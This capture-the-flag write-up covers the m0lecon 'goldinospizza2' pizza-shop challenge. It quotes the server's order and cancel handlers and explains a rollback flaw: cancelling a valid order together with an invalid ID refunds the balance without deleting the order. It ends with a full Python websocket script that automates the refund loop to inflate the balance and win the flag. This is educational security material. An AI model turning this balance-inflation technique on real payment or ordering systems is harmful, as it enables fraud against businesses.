# goldinospizza2

```py
def order(data, ws, n):
    if "orders" not in data:
        raise AssertionError("NO 🍕 'orders' IN YOUR ORDER")
    if type(data["orders"]) is not list:
        raise AssertionError("NO 🍕 'orders' LIST IN YOUR ORDER")
    if n + len(data["orders"]) > max_requests:
        return len(data["orders"]), None
    for item in data["orders"]:
        if type(item) is not dict:
            db.session.rollback()
            raise AssertionError("ONE OF YOUR 🍕 ORDERS IS NOT AN ORDER")
        if "product" not in item:
            db.session.rollback()
            raise AssertionError("NO 🍕 'product' IN ONE OF YOUR ORDERS")
        if type(item["product"]) is not int:
            db.session.rollback()
            raise AssertionError("ONE OF YOUR 🍕 'product' IDS IS NOT INT")
        if "quantity" not in item:
            db.session.rollback()
            raise AssertionError("NO 🍕 'quantity' IN ONE OF YOUR ORDERS")
        if type(item["quantity"]) is not int:
            db.session.rollback()
            raise AssertionError("ONE OF YOUR 🍕 'quantity' IS NOT INT")
        if item["quantity"] <= 0:
            db.session.rollback()
            raise AssertionError("ONE OF YOUR 🍕 'quantity' IS NOT VALID")
        product = db.session.execute(db.select(Product).filter(
            Product.id == item["product"])).scalars().one_or_none()
        if product is None:
            db.session.rollback()
            raise AssertionError("WE DON'T SELL THAT 🍕")
        quantity = item["quantity"]
        current_user.balance -= product.price * quantity
        if current_user.balance < 0:
            db.session.rollback()
            raise AssertionError("NO 🍕 STEALING ALLOWED!")
        db.session.add(Order(
            user_id=current_user.id,
            product_id=product.id,
            product_quantity=quantity,
            product_price=product.price
        ))
        if product.id == 0 and quantity > 0:
            ws.send(
                f"WOW you are SO rich! Here's a little extra with your golden special 🍕: {os.environ['FLAG']}")
    db.session.add(current_user)
    db.session.commit()
    return len(data["orders"]), {"ok": True, "balance": current_user.balance, "orders": _orders()}
```

In this version, it ensures that the quantity won't be negative
```py
        if current_user.balance < 0:
            db.session.rollback()
            raise AssertionError("NO 🍕 STEALING ALLOWED!")
```

So we need to find alternative  way. A way that performs plus operation on balance. And only way is in `cancel`.
```py
def cancel(data, ws, n):
    if "orders" not in data:
        raise AssertionError("NO 🍕 'orders' TO CANCEL IN YOUR CANCEL ORDER")
    if type(data["orders"]) is not list:
        raise AssertionError(
            "NO 🍕 'orders' LIST TO CANCEL IN YOUR CANCEL ORDER")
    if n + len(data["orders"]) > max_requests:
        return len(data["orders"]), None
    for item in data["orders"]:
        if type(item) is not int:
            db.session.rollback()
            raise AssertionError("ONE OF YOUR 🍕 CANCEL ORDER IDS IS NOT INT")
        order = db.session.execute(db.select(Order).filter(
            Order.id == item, Order.user_id == current_user.id)).scalars().one_or_none()
        if order is None:
            db.session.rollback()
            raise AssertionError("YOU DID NOT ORDER THAT 🍕")
        current_user.balance += order.product_price * order.product_quantity
        db.session.delete(order)
    db.session.add(current_user)
    db.session.commit()
    return len(data["orders"]), {"ok": True, "balance": current_user.balance, "orders": _orders()}
```

The example `cancel` request is as follows
```json
{
    "request": "cancel",
    "orders": [1, 2]
}
```
That will remove the orders with IDs 1 and 2. 
Now, assuming my order ID is 1, when I try cancelling orders 1 and -1 (one valid order and one invalid one), the money is refunded to me due to this line, and the order will be deleted from the database.
```py
        current_user.balance += order.product_price * order.product_quantity
        db.session.delete(order)
```

However, the database is not committed. When attempting to process the order with ID -1, database rollback will roll back and the server will throw an error.
```py
        order = db.session.execute(db.select(Order).filter(
            Order.id == item, Order.user_id == current_user.id)).scalars().one_or_none()
        if order is None:
            db.session.rollback()
            raise AssertionError("YOU DID NOT ORDER THAT 🍕")
```

So, the order with ID 1 still remains, but the current_user was updated. To trigger the execution of these two lines, we can make a purchase.
```py
    db.session.add(current_user)
    db.session.commit()
```

Making the database add the `current_user` and commit. That makes orders remain and update user balance. 

Performing theese two operations (purchase and commit) multiple of times and we will get enough money to get the flag.

Because I didn't know how to code websocket 😢, I performed it by hands. I need to commit the database at the end of every request, because server only allow user to send some request.

But if you can code websocket, just `cancel` one valid order and one invalid order multiple times. And you can buy the flag without committing.

This is author's code to exploit, save it for future use with websocket 😁
```py
import asyncio
import base64
import json
import random
import ssl
import string
import zlib
import time

import requests
import websockets
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
no_verify_cert_ssl_context = ssl.create_default_context()
no_verify_cert_ssl_context.check_hostname = False
no_verify_cert_ssl_context.verify_mode = ssl.CERT_NONE

# host = "127.0.0.1:8000"
# host = "127.0.0.1:4242"
host = "goldinospizza2.challs.m0lecon.it"

charset = string.ascii_letters + string.digits + string.punctuation
user = "".join(random.choice(charset) for i in range(32))
password = "".join(random.choice(charset) for i in range(32))

item_id = 17
item_price = 15
initial_balance = 30

results = []
for a in range(2, 10):
    b = initial_balance
    # n = 1
    n = 0
    q = 0
    l = 0
    while b < 1e6 - l * a:
        q = int(b / item_price)
        l = q * item_price
        b -= l
        n += 1
        n += a
        b += l * a
    while b < 1e6:
        n += 1
        b += l
    n += 1
    results.append([n, a])
best = min(results, key=lambda r: r[0])
print(best)
best = best[1]

# def serialize(data):
#     return base64.standard_b64encode(zlib.compress(data.encode("ascii"), level=-1)).decode("ascii")
#
#
# def unserialize(data):
#     return zlib.decompress(base64.standard_b64decode(data.encode("ascii"))).decode("ascii")


def show(r):
    try:
        d = r.json()
    except requests.exceptions.JSONDecodeError:
        d = r.text
    # print(r.status_code, d, f"Set-Cookie={r.headers['Set-Cookie']}")
    print(r.status_code, f"Set-Cookie={r.headers.get('Set-Cookie', None)}")
    if r.status_code != 200:
        raise AssertionError()
    return r


async def ws_get(data, ws):
    data = json.dumps(data)
    print(f"> {data}")
    await ws.send(data)
    data = await ws.recv()
    print(f"< {data}")
    try:
        return json.loads(data)
    except json.decoder.JSONDecodeError as e:
        return data


with requests.Session() as s:
    # REGISTER
    try:
        r = show(s.get(f"https://{host}/csrf", verify=False))
        # time.sleep(5)
        r = show(s.post(f"https://{host}/register", json={
            "username": user,
            "password": password,
            "confirm": password,
        }, headers={
            "Referer": f"https://{host}/register",
            "X-CSRF-Token": r.json()["csrfToken"],
        }, verify=False))
        # time.sleep(5)
    except AssertionError:
        pass
    # LOGIN
    r = show(s.get(f"https://{host}/csrf", verify=False))
    # time.sleep(5)
    r = show(s.post(f"https://{host}/login", json={
        "username": user,
        "password": password,
    }, headers={
        "Referer": f"https://{host}/login",
        "X-CSRF-Token": r.json()["csrfToken"],
    }, verify=False))
    # time.sleep(5)
    # API
    p = s.prepare_request(requests.Request("GET", f"https://{host}/sock"))
    headers = p.headers.copy()
    headers.update({"Connection": "Upgrade", })

    async def do():
        ws = await websockets.connect(
            f"wss://{host}/sock",
            extra_headers=headers,
            ssl=no_verify_cert_ssl_context
        )
        # await asyncio.sleep(5)
        # print(await asyncio.gather(*( ws_get({"request": "cancel", "orders": [o["id"], o["id"], o["id"], o["id"], -1]}, ws) for i in range(100))))
        try:
            # r = await ws_get({"request": "balance"}, ws)
            # b = r["balance"]
            b = initial_balance
            q = 0
            l = 0
            n = 0
            while b < 1e6 - l * best:
                q = int(b / item_price)
                l = q * item_price
                r = await ws_get({"request": "order", "orders": [{"product": item_id, "quantity": q}]}, ws)
                b -= l
                o = r["orders"][-1]
                n += 1
                print(b, n)
                await ws.close()
                ws = await websockets.connect(
                    f"wss://{host}/sock",
                    extra_headers=headers,
                    ssl=no_verify_cert_ssl_context
                )
                # await asyncio.sleep(5)
                n = 0
                for i in range(best):
                    r = await ws_get({"request": "cancel", "orders": [o["id"], -1]}, ws)
                    b += l
                    n += 1
                print(b, n)
                # r = await ws_get({"request": "balance"}, ws)
            while b < 1e6:
                r = await ws_get({"request": "cancel", "orders": [o["id"], -1]}, ws)
                b += q * item_price
                n += 1
                print(b, n)
            # r = await ws_get({"request": "orders"}, ws)
            # r = await ws_get({"request": "balance"}, ws)
            r = await ws_get({"request": "order", "orders": [{"product": 0, "quantity": 1}]}, ws)
            print(r.split(": ")[1])
            # while True:
            #     data = input("> ")
            #     await ws.send(data)
            #     data = await ws.recv()
            #     print(f"< {data}")
        except websockets.ConnectionClosed as e:
            data = await ws.recv()
            print(f"< {data}")
            print(repr(e))
        except (KeyboardInterrupt, EOFError) as e:
            print(repr(e))

    asyncio.run(do())
```